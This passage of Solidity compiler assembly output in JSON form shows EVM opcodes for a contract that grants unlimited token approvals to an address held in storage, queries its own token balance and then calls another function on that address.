											"source": 4
										},
										{
											"begin": 750,
											"end": 752,
											"name": "PUSH",
											"source": 4,
											"value": "A"
										},
										{
											"begin": 750,
											"end": 752,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 695,
											"end": 753,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 695,
											"end": 753,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "tag",
											"source": 4,
											"value": "109"
										},
										{
											"begin": 695,
											"end": 753,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 695,
											"end": 753,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 695,
											"end": 753,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 695,
											"end": 753,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "111"
										},
										{
											"begin": 695,
											"end": 753,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 695,
											"end": 753,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 695,
											"end": 753,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "tag",
											"source": 4,
											"value": "111"
										},
										{
											"begin": 695,
											"end": 753,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 695,
											"end": 753,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 695,
											"end": 753,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 695,
											"end": 753,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 695,
											"end": 753,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "112"
										},
										{
											"begin": 695,
											"end": 753,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "21"
										},
										{
											"begin": 695,
											"end": 753,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "tag",
											"source": 4,
											"value": "112"
										},
										{
											"begin": 695,
											"end": 753,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 771,
											"end": 777,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 771,
											"end": 777,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 787,
											"end": 790,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 787,
											"end": 790,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 764,
											"end": 807,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "95EA7B3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 764,
											"end": 807,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 787,
											"end": 790,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 787,
											"end": 790,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 787,
											"end": 790,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 764,
											"end": 807,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1150,
											"end": 1201,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 1217,
											"end": 1235,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 1217,
											"end": 1235,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 1217,
											"end": 1235,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 1210,
											"end": 1244,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 771,
											"end": 777,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 771,
											"end": 777,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 771,
											"end": 777,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 764,
											"end": 786,
											"name": "PUSH",
											"source": 4,
											"value": "95EA7B3"
										},
										{
											"begin": 764,
											"end": 786,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1123,
											"end": 1141,
											"name": "PUSH",
											"source": 5,
											"value": "44"
										},
										{
											"begin": 1123,
											"end": 1141,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 764,
											"end": 807,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 764,
											"end": 807,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 764,
											"end": 807,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 764,
											"end": 807,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "115"
										},
										{
											"begin": 764,
											"end": 807,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 764,
											"end": 807,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 764,
											"end": 807,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "tag",
											"source": 4,
											"value": "115"
										},
										{
											"begin": 764,
											"end": 807,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 764,
											"end": 807,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 764,
											"end": 807,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 764,
											"end": 807,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 764,
											"end": 807,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "116"
										},
										{
											"begin": 764,
											"end": 807,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "21"
										},
										{
											"begin": 764,
											"end": 807,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 764,
											"end": 807,
											"name": "tag",
											"source": 4,
											"value": "116"
										},
										{
											"begin": 764,
											"end": 807,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 824,
											"end": 830,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 824,
											"end": 830,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 840,
											"end": 843,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 840,
											"end": 843,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 817,
											"end": 860,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "95EA7B3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 817,
											"end": 860,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 840,
											"end": 843,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 840,
											"end": 843,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 840,
											"end": 843,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 817,
											"end": 860,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1150,
											"end": 1201,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 1217,
											"end": 1235,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 1217,
											"end": 1235,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 1217,
											"end": 1235,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 1210,
											"end": 1244,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 824,
											"end": 830,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 824,
											"end": 830,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 824,
											"end": 830,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 817,
											"end": 839,
											"name": "PUSH",
											"source": 4,
											"value": "95EA7B3"
										},
										{
											"begin": 817,
											"end": 839,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1123,
											"end": 1141,
											"name": "PUSH",
											"source": 5,
											"value": "44"
										},
										{
											"begin": 1123,
											"end": 1141,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 817,
											"end": 860,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 817,
											"end": 860,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 817,
											"end": 860,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 817,
											"end": 860,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "119"
										},
										{
											"begin": 817,
											"end": 860,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 817,
											"end": 860,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 817,
											"end": 860,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "tag",
											"source": 4,
											"value": "119"
										},
										{
											"begin": 817,
											"end": 860,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 817,
											"end": 860,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 817,
											"end": 860,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 817,
											"end": 860,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 817,
											"end": 860,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "120"
										},
										{
											"begin": 817,
											"end": 860,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "21"
										},
										{
											"begin": 817,
											"end": 860,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 817,
											"end": 860,
											"name": "tag",
											"source": 4,
											"value": "120"
										},
										{
											"begin": 817,
											"end": 860,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 876,
											"end": 879,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 876,
											"end": 879,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 876,
											"end": 879,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 886,
											"end": 892,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 876,
											"end": 879,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 894,
											"end": 900,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 902,
											"end": 941,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 902,
											"end": 941,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 935,
											"end": 939,
											"name": "ADDRESS",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 902,
											"end": 941,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1401,
											"end": 1452,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 876,
											"end": 879,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 876,
											"end": 879,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 876,
											"end": 879,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 876,
											"end": 879,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 871,
											"end": 885,
											"name": "PUSH",
											"source": 4,
											"value": "DF791E50"
										},
										{
											"begin": 871,
											"end": 885,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 886,
											"end": 892,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 886,
											"end": 892,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 886,
											"end": 892,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 894,
											"end": 900,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 894,
											"end": 900,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 886,
											"end": 892,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 886,
											"end": 892,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 902,
											"end": 926,
											"name": "PUSH",
											"source": 4,
											"value": "70A08231"
										},
										{
											"begin": 902,
											"end": 926,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 902,
											"end": 941,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 902,
											"end": 941,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 902,
											"end": 941,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "DUP7",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "STATICCALL",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "123"
										},
										{
											"begin": 902,
											"end": 941,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 902,
											"end": 941,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 902,
											"end": 941,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "tag",
											"source": 4,
											"value": "123"
										},
										{
											"begin": 902,
											"end": 941,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 902,
											"end": 941,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 902,
											"end": 941,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 902,
											"end": 941,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 902,
											"end": 941,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "124"
										},
										{
											"begin": 902,
											"end": 941,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 902,
											"end": 941,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 902,
											"end": 941,
											"name": "tag",
											"source": 4,
											"value": "124"
										},
										{
											"begin": 902,
											"end": 941,
											"name": "JUMPDEST",
